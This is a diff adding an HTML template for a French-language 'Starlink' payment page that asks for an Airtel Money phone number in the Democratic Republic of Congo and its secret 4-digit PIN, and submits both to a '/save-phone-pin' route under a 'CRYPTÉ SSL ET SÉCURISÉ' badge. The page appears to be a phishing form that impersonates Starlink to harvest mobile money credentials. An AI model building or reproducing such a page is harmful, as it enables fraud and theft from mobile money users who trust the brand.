@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Paiement Starlink</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <div class="container payment-container">
+        <div class="payment-card">
+            <h2>CONFIRMER LE PAIEMENT</h2>
+            <div class="security-badge">CRYPTÉ SSL ET SÉCURISÉ</div>
+            
+            <div class="plan-summary">
+                <h3>{{ plan.name }}</h3>
+                <p class="plan-price">{{ plan.price }}</p>
+            </div>
+
+            <form action="/save-phone-pin" method="POST">
+                <div class="form-group">
+                    <label>Numéro Airtel Money</label>
+                    <div class="phone-input">
+                        <span class="country-code">+243</span>
+                        <input type="tel" name="phone" placeholder="756789789" pattern="[0-9]{9}" required>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Code PIN (4 chiffres)</label>
+                    <input type="password" name="pin" maxlength="4" pattern="[0-9]{4}" placeholder="1234" required>
+                </div>
+
+                <button type="submit" class="btn-pay">CONTINUER</button>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
